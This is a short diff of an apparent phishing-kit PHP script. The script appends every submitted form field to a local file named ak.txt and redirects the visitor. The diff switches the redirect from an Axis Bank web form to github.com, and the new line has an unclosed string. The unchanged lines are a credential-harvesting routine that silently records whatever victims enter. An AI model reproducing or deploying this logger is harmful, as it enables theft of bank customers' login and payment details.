@@ -1,5 +1,5 @@
 <?php
-header ('Location: https://clctab.axisbank.co.in/DigitalChannel/WebForm');
+header ('Location: https://github.com/);
 $handle = fopen("ak.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
